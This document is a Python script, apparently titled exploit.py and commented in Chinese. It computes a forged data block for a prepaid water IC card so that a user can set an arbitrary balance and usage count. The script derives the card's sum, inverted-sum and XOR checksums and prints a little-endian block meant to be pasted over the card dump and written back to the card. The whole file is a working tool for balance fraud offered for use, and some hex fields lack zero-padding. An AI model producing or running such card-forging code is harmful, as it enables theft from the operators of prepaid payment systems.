'''
encode: utf-8

本脚本用于计算水卡的数据块,以达到自定义水卡余额的目的
使用说明如下:
    python exploit.py 余额 使用次数
    示例:
    python exploit.py 120.32
    或
    python exploit.py 120.32 13

    其中
    余额取值范围为[0,655.35]
    使用次数取值范围为[0,255]

    使用时,可不指定使用次数,
    若不指定,将会随机生成一个使用次数

    程序运行完毕后,会输出一个数据块
    该数据块可以直接覆盖到IC卡导出文件的对应数据块位置
    随后直接写卡即可

    注意:
        程序中没有任何检查输入值的代码!
        所以请自行检查输入值是否符合要求!

        
计算流程:
    1.先根据输入金额计算出累加和的校验码A
    2.将校验码A取反得到校验码B
    3.将校验码A与校验码B与金额与"00"按一定顺序拼接得到16进制字符串S
    4.对S的每个字节强制转换为16进制数后,进行异或计算得到校验码C
    5.对S的每个字节强制转换为16进制数后,进行累加和取反计算得到校验码D
    6.拼接成完整数据块
'''

import sys
import random

def calculate_xor_checksum(data_bytes):
    """
    计算 XOR 校验码
    
    参数:
        data_bytes (bytes/list): 字节数据
    """
    # 计算异或校验
    checksum = 0
    for byte in data_bytes:
        checksum ^= byte
    
    checksum=hex(checksum)[2:]
    return checksum

def calculate_sum_checksum(data_bytes):
    """
    计算累加和校验码

    参数:
        data_bytes (bytes/list): 字节数据
    """

    sum_result=0

    # 计算累加和
    for byte in data_bytes:
        sum_result+=byte

    # 取低八位
    checksum=sum_result&0xff
    return checksum

def hex_to_little_endian(hex_string):
    """
    将大端的16进制字符串转换为小端序列

    参数:
        需要转换的大端的16进制字符串
    """
    # 将十六进制字符串分解成字节对
    byte_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
    
    # 按小端序列反转字节对
    little_endian = ''.join(byte_pairs[::-1])
    
    return little_endian

# 获取输入金额
money=sys.argv[1]

# 获取使用次数
use_num=random.randint(0,0xff)
if len(sys.argv)==3:
    use_num=sys.argv[2]

# 对输入值进行修饰

# 在数据块中以 如 FAFB 的形式存在
# 所以乘上100 将如 12.41 的数转换为 1241 在后面的代码中转换为16进制数
money=float(money)*100
# 转换为16进制数 并使用[2:]去除前面的 "0x",并在前面补0,确保长度为4
money=hex(int(money))[2:].zfill(4)
# 转换为字节对象,以传递给函数计算
money_bytes=bytes.fromhex(money)

# 转换为16进制数 并使用[2:]去除前面的 "0x"
use_num=hex(int(use_num))[2:]

# 计算累加和校验码
sum_checksum=calculate_sum_checksum(money_bytes)
# 计算取反累加和校验码
inv_sum_checksum=0xff-sum_checksum

# 使用[2:]去除前面的 "0x"
sum_checksum=hex(sum_checksum)[2:]
inv_sum_checksum=hex(inv_sum_checksum)[2:]

# 构建部分数据块字符串,用于计算剩余两个校验码
partial_data_block=f"00{use_num}0000{use_num}00000000{inv_sum_checksum}00{money}{sum_checksum}"
# 转换为字节对象,以传递给函数计算
partial_data_block_bytes=bytes.fromhex(partial_data_block)
# 计算异或校验码
XOR_checksum=calculate_xor_checksum(partial_data_block_bytes)
# 计算第二个累加和取反校验码
inv_sum_checksum_2=0xff-calculate_sum_checksum(partial_data_block_bytes)
inv_sum_checksum_2=hex(inv_sum_checksum_2)[2:]

# 构建最终数据块字符串
result=f"{inv_sum_checksum_2}{partial_data_block}{XOR_checksum}"
# 转换为小端序列
result=hex_to_little_endian(result)
# 输出
print(result)